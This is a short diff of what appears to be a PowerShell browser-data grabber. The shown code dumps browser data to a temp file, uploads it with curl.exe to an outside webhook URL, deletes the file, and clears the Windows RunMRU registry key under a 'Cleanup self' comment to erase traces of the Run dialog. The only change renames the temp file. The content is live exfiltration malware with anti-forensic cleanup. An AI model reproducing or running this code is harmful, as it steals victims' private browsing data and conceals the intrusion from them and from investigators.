@@ -75,9 +75,9 @@ function upload{
     if (-not ([string]::IsNullOrEmpty($file))){curl.exe -F "file1=@$file" $hookurl}
 }
 
-Get-BrowserData >> $env:TMP\--BrowserData.txt
-upload -file $env:TMP\--BrowserData.txt
-Remove-Item $env:TEMP/--BrowserData.txt
+Get-BrowserData >> $env:TMP\--BrowserHistory.txt
+upload -file $env:TMP\--BrowserHistory.txt
+Remove-Item $env:TEMP/--BrowserHistory.txt
 
 # Cleanup self
 reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f
